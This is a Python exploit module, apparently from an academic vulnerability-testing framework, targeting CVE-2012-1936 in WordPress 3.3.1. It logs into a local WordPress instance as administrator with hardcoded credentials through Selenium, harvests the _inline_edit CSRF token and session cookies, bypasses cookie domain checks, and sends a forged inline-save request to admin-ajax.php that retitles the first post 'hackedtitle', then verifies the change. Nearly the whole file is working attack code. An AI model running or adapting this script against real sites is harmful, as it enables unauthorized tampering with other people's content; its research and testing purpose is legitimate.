
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import time
import urllib
import urllib2
import cookielib
from selenium.common.exceptions import NoSuchElementException
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_1936_A",
                  'Description' : "This exploit utilizes selenium to login as administrator, "
                                  "extract the _inline_edit CSRF token, as well as to get "
                                  "some valid session cookies. The POST request is "
                                  "constructed and sent using urllib. The payload changes "
                                  "the title for the first post.",
                  'References' :  [['CVE', '2012-1936']],
                  'Target' :      "Wordpress 3.3.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-1936",
                  'Type' :        'CSRF'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress/wp-login.php")

        time.sleep(3)
        self.logger.info("Logging in as admin to retrieve secret CSRF tokens")
        driver.find_element_by_id("user_login").send_keys("wpadmin")
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").click()

        driver.get_element(by_xpath="//a[@href='edit.php']").click()
        secret_key = driver.get_element(by_id="_inline_edit").get_attribute('value')

        self.logger.info("Received CSRF token \"%s\" for _inline_edit", secret_key)
        self.logger.info("A user must be authenticated for this exploit to work, will proceed using the admin-session cookies")
        cookies = driver.get_cookies()

        form_data = {"post_title" : "hackedtitle",
                     "post_name" : "hackedtitle",
                     "mm" : "02",
                     "jj" : "22",
                     "aa" : "2013",
                     "hh" : "19",
                     "mn" : "00",
                     "ss" : "00",
                     "post_author" : "1",
                     "post_password" : "",
                     "post_category%5B%5D" : "0",
                     "post_category%5B%5D" : "1",
                     "tax_input%5Bpost_tag%5D" : "",
                     "comment_status" : "open",
                     "ping_status" : "open",
                     "_status" : "publish",
                     "post_format" : "0",
                     "_inline_edit" : str(secret_key),
                     "post_view" : "list",
                     "screen" : "edit-post",
                     "action" : "inline-save",
                     "post_type" : "post",
                     "post_ID" : "1",
                     "edit_date" : "true",
                     "post_status" : "all"}

        class AcceptAllCookiePolicy(cookielib.CookiePolicy):
            """This is a hack to bypass domain checks when adding cookies to the CookieJar"""
            rfc2965 = False
            def set_ok(self, cookie, request):
                return True
            def return_ok(self, cookie, request):
                return True

        cookie_jar = cookielib.CookieJar(policy=AcceptAllCookiePolicy())

        for cookie in cookies:
            cookie_jar.set_cookie(
                cookielib.Cookie(
                    version=0,
                    name=cookie['name'],
                    value=cookie['value'],
                    port='80',
                    port_specified=False,
                    domain=cookie['domain'],
                    domain_specified=False, #was true
                    domain_initial_dot=False,
                    path=cookie['path'],
                    path_specified=True,
                    secure=cookie['secure'],
                    expires=cookie['expiry'],
                    discard=False,
                    comment=None,
                    comment_url=None,
                    rest={'HttpOnly': None},
                    rfc2109=False))

        url = "http://localhost/wordpress/wp-admin/admin-ajax.php"    
        request = urllib2.Request(url, urllib.urlencode(form_data))
        cookie_jar.add_cookie_header(request)

        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(), #cookie_jar
                                      urllib2.HTTPHandler()) #debuglevel=1


        #response = opener.open(url1, urllib.urlencode(form_data) )
        self.logger.info("Sending payload...")
        response = opener.open(request)

        #print "RESPONSE", response.readlines()
        #print "HEADERS", response.info()
        self.logger.info("Done. You should find that first post is now titled \"hackedtitle\"")
        driver.cleanup()
        return


    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/wordpress/")
        
        try:
            driver.get_element(by_link_text="hackedtitle")
            self.logger.info("Verified new post")
            verified = True
        except NoSuchElementException:
            self.logger.error("Failed to create post")

        driver.cleanup()
        return verified
